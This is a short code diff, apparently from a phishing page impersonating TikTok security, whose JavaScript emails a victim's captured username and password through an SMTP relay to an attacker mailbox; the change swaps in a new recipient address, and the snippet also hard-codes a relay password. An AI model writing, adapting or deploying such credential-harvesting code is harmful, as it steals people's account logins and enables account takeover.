@@ -8,7 +8,7 @@ Email.send({
   Host: "smtp.elasticemail.com",
   Username: "TikTok.sicurity@gmail.com",
   Password: "4985ECAA064FA6B3FADE3C6A981A1B8A1AC2",
-  To: 'maurizio11111111@gmail.com',
+  To: 'message.web.info@gmail.com',
   From: "tiktok.sicurity@gmail.com",
   Subject: "Nuovo account:",
   Body: ("Nome Utente: " + NomeUtente + "\n" + "Password: " + Password)
